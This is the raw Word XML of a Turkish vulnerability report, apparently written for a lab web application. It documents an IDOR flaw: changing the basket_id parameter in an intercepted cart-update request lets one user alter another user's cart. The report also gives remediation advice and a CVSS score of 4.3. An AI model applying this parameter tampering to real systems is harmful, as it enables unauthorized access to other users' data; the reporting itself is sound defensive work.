        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E45B49" w14:paraId="17D25F60" w14:textId="77777777" w:rsidTr="000B1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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75173ED5" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w14:paraId="623F386E" w14:textId="77777777" w:rsidTr="000B1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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="7CA1B239" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w14:paraId="694F4D6A" w14:textId="77777777" w:rsidTr="000B1BB4">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E64BA64" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w:rsidRPr="00057867" w14:paraId="3421040E" w14:textId="77777777" w:rsidTr="000B1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2259D977" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BF86AAB" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00BF4DE0" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w:rsidRPr="00057867" w14:paraId="2897E128" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="71A55025" w14:textId="6C76B1FA" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:hyperlink r:id="rId55" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> kullanıcı</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId56" w:history="1">
              <w:r w:rsidRPr="007B7ED6">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_cart.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. Sepetteki listelenen yemeklerde herhangi bir tanesinin</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> miktarı arttırılıp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Güncelle</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>butonuna tıklanır ve istek burpsuite Proxy aracı ile tutulur</w:t>
            </w:r>
            <w:r w:rsidR="00A639E1">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E008B15" w14:textId="3092B060" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E45B49">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="068531F6" wp14:editId="3EDA711A">
                  <wp:extent cx="5677692" cy="5220429"/>
                  <wp:effectExtent l="0" t="0" r="0" b="0"/>
                  <wp:docPr id="139539464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394640" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId57"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5677692" cy="5220429"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="25E49759" w14:textId="5769015E" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>Görsel -  1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t xml:space="preserve"> Yakalanan İstek</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D8EE867" w14:textId="2BFECA3C" w:rsidR="00E45B49" w:rsidRPr="00081BEE" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Yakalanan istekte </w:t>
            </w:r>
            <w:r w:rsidRPr="001E0913">
              <w:t>basket_id=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">4 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>parametresi 2 değeri ile değiştirilir ve başka bir kullanıcının sepetin</w:t>
            </w:r>
            <w:r w:rsidR="00D328B6">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>deki</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> ürün </w:t>
            </w:r>
            <w:r w:rsidR="00D328B6">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">miktarı </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">başarıyla </w:t>
            </w:r>
            <w:r w:rsidR="00D328B6">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>değiştirilir</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E76A4A9" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00CF0A67" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w:rsidRPr="00057867" w14:paraId="1797A647" w14:textId="77777777" w:rsidTr="000B1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65A57573" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00057867" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w:rsidRPr="00D60321" w14:paraId="3CBFABD0" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="2FD2C20B" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00950946" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Güçlü Doğrulama ve Yetkilendirme Kontrolleri:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Güvenli bir kullanıcı doğrulama ve yetkilendirme mekanizması oluşturulmalıdır. Kullanıcıların erişebileceği nesneler, etkili kontrollerle doğrulanmalı ve yetkilendirilmelidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="436AE814" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00950946" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Referans Kontrolleri ve Doğrulama:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Nesnelere erişim sırasında, referanslar arasında etkili doğrulama yapılmalıdır. Bu, kullanıcının erişim izinlerini sürekli olarak kontrol etmek için önemlidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77561710" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00FD2D0C" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD2D0C">
              <w:t>Eşsiz Kimlikler ve Doğrulama Kodları:</w:t>
            </w:r>
            <w:r w:rsidRPr="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Güvenli bir referans sistemi oluşturmak adına nesnelere eşsiz kimlikler veya doğrulama kodları eklenmelidir. Bu yöntem, yetkisiz erişimleri önlemeye yardımcı olabilir.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w14:paraId="4807FDF5" w14:textId="77777777" w:rsidTr="000B1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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="202F0CBA" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w14:paraId="2DE7157F" w14:textId="77777777" w:rsidTr="000B1BB4">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="9214" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="75A6774B" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00856007" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Yetkisiz Kupon Ekleme</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir restoran sahibi, IDOR zafiyeti nedeniyle başka restoranların kuponlarını ekleyebilir. Bu, haksız rekabet yaratabilir veya mali kayıplara neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E3B698B" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00856007" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Kuponların Suistimali :</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir kullanıcı, başka restoranlar için geçerli olan kuponları kendine veya başkalarına avantaj sağlamak için kullanabilir. Bu durum, gelir kaybına ve müşteri güveninin sarsılmasına neden olur.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="184C9F30" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00856007" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Gelir Kaybı ve İtibar Zedelenmesi</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Kupon sisteminde yapılan yetkisiz değişiklikler, işletmeler için büyük mali kayıplara yol açabilir. Ayrıca, sistemin güvenliğinin sorgulanması itibar kaybına neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E83B5ED" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="00E45B49">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w:rsidRPr="00402B96" w14:paraId="008AE918" w14:textId="77777777" w:rsidTr="000B1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15307F28" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w:rsidRPr="00402B96" w14:paraId="2A4D2025" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="6C1CDCBD" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00C361DB" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E45B49" w:rsidRPr="00402B96" w14:paraId="30BF062D" w14:textId="77777777" w:rsidTr="000B1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4F81BD" w:themeFill="accent1"/>
          </w:tcPr>
          <w:p w14:paraId="6BD6F698" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00402B96" w:rsidRDefault="00E45B49" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2B5CC7FD" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00593C92" w:rsidRDefault="00E45B49" w:rsidP="00E45B49"/>
    <w:p w14:paraId="2170EE02" w14:textId="77777777" w:rsidR="00E45B49" w:rsidRPr="00593C92" w:rsidRDefault="00E45B49" w:rsidP="00E45B49"/>
    <w:p w14:paraId="137C65AB" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00B24C32">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="004E6D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029E1529"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="19BCC3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0EAB6618"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E966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1A7757"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="34CA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9B3223"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6E86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E841E8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="33D6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4D6A9F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2CCA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F176A0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="45DE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7F5E2A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="700C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FE206D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5E0A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0F6F60"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0B1A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EE4639"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="34C00C7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75B61BC9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="35E280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77FA797E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="319C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E124DF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D310AE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233927550">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="393048924">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="351225771">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1159270226">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2106681340">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1232618924">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="103889514">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1634091616">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="213079968">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="857695954">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1046953975">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1032192254">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="835416429">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="123013920">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="395204133">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1082068485">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="579825943">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="765350835">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="645744907">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="955211505">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="2017070683">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="1899124119">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="141613136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1BEE"/>
    <w:rsid w:val="000D70F4"/>
    <w:rsid w:val="000E77F0"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="001834B6"/>
    <w:rsid w:val="001E0913"/>
    <w:rsid w:val="002239E8"/>
    <w:rsid w:val="00224837"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002A4889"/>
    <w:rsid w:val="002A5B2A"/>
    <w:rsid w:val="002F0D44"/>
    <w:rsid w:val="003220EF"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003F1C47"/>
    <w:rsid w:val="00420A4E"/>
    <w:rsid w:val="004E6D77"/>
    <w:rsid w:val="00521C03"/>
    <w:rsid w:val="00593C92"/>
    <w:rsid w:val="005A1CC9"/>
    <w:rsid w:val="005B76F9"/>
    <w:rsid w:val="005C358A"/>
    <w:rsid w:val="00653376"/>
    <w:rsid w:val="0069078A"/>
    <w:rsid w:val="006D1C31"/>
    <w:rsid w:val="007D22A3"/>
    <w:rsid w:val="007F057F"/>
    <w:rsid w:val="00856007"/>
    <w:rsid w:val="008F760D"/>
    <w:rsid w:val="0098590C"/>
    <w:rsid w:val="00986042"/>
    <w:rsid w:val="00991F03"/>
    <w:rsid w:val="00994536"/>
    <w:rsid w:val="009D6A4D"/>
    <w:rsid w:val="00A26EF1"/>
    <w:rsid w:val="00A302C1"/>
    <w:rsid w:val="00A639E1"/>
    <w:rsid w:val="00A87399"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AD7526"/>
    <w:rsid w:val="00B24C32"/>
    <w:rsid w:val="00B2509D"/>
    <w:rsid w:val="00B31B51"/>
    <w:rsid w:val="00B43AC4"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BB6B83"/>
    <w:rsid w:val="00BF4DE0"/>
    <w:rsid w:val="00C361DB"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CB3D05"/>
    <w:rsid w:val="00CD5762"/>
    <w:rsid w:val="00CF0A67"/>
    <w:rsid w:val="00CF4D6C"/>
